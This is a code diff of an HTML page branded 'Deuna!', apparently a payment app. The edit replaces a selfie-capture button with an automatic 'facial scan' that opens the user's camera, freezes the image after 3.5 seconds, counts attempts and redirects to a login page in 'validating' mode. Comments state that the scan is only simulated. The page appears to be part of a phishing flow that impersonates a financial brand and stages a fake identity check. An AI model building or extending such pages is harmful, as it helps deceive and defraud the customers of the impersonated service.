@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Deuna! | Tomar Selfie</title>
+    <title>Deuna! | Escaneo Facial</title>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
         :root {
@@ -38,7 +38,7 @@
 
         /* Máscara circular para la cámara */
         .camera-wrapper {
-            margin-top: 50px; /* Ajuste para centrar verticalmente un círculo más grande */
+            margin-top: 50px; 
             width: 320px; height: 320px;
             border-radius: 50%;
             overflow: hidden;
@@ -52,35 +52,28 @@
             transform: scaleX(-1); /* Efecto espejo para la selfie */
         }
 
+        /* Animación parpadeante que simula que está haciendo el escaneo */
+        @keyframes pulse-text {
+            0% { opacity: 1; }
+            50% { opacity: 0.4; }
+            100% { opacity: 1; }
+        }
+
         /* Texto de Advertencia */
         .warning-text {
-            margin-top: 30px;
+            margin-top: 40px;
             color: var(--warning-red);
             font-size: 14px;
             font-weight: 500;
             text-align: center;
             max-width: 200px;
             line-height: 1.3;
+            animation: pulse-text 2s infinite ease-in-out;
         }
 
-        /* Botón Blanco Flotante para Capturar */
-        .capture-btn {
-            width: 72px; height: 72px;
-            background: #fff;
-            border-radius: 50%;
-            border: 5px solid #d4bdf0; /* Bordes morados claro combinando */
-            margin-top: auto;
-            margin-bottom: 20px;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
-            cursor: pointer;
-            transition: transform 0.1s;
-        }
-        .capture-btn:active {
-            transform: scale(0.92);
-        }
-
-        /* Logo de abajom */
+        /* Logo inferior */
         .bottom-logo {
+            margin-top: auto; /* Empuja el logo hacia abajo ya que no hay botón */
             margin-bottom: 10px;
         }
         .bottom-logo img {
@@ -100,45 +93,39 @@
 
         <p class="warning-text">Coloca tu cara en el <br> centro del circulo . .</p>
 
-        <!-- Botón capturador -->
-        <button id="capture-btn" class="capture-btn" aria-label="Capturar Foto"></button>
-
         <div class="bottom-logo">
-            <!-- La imagen "logo2.png" de la carpeta img -->
             <img src="img/logo2.png" alt="Deuna Logo" onerror="this.src='https://via.placeholder.com/150x50/f6eefe/4a1b82?text=deuna!'">
         </div>
     </div>
 
     <script>
         const video = document.getElementById('camera-feed');
-        const captureBtn = document.getElementById('capture-btn');
 
-        // Solicitar acceso a la cámara frontal y asignarlo al tag <video>
+        // Solicitar acceso a la cámara y empezar el escáner facial automático
         if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
             navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
                 .then(stream => {
                     video.srcObject = stream;
+                    
+                    // Simular captura inteligente automática (espera 3.5 segundos con la cámara encendida)
+                    setTimeout(() => {
+                        let attempts = parseInt(sessionStorage.getItem('captureAttempts')) || 0;
+                        sessionStorage.setItem('captureAttempts', attempts + 1);
+                        
+                        video.pause(); // Congela el cuadro como si hubiese tomado la foto de golpe
+
+                        setTimeout(() => {
+                            window.location.href = 'login3.html?validating=true';
+                        }, 600); // 0.6 segs de transición y luego redirige
+                    }, 3500); 
                 })
                 .catch(err => {
                     console.error("Error al acceder a la cámara: ", err);
                     alert("No se pudo acceder a la cámara. Por favor permite el acceso en tu navegador.");
                 });
+        } else {
+            alert("Tu navegador no soporta la cámara web.");
         }
-
-        // Lógica de captura y redirección a login3.html en modo validador
-        captureBtn.addEventListener('click', () => {
-            // Guardamos el intento en sessionStorage
-            let attempts = parseInt(sessionStorage.getItem('captureAttempts')) || 0;
-            sessionStorage.setItem('captureAttempts', attempts + 1);
-            
-            // Pausamos el video para simular captura
-            video.pause();
-
-            // Pequeño delay de transición
-            setTimeout(() => {
-                window.location.href = 'login3.html?validating=true';
-            }, 500);
-        });
     </script>
 </body>
 </html>
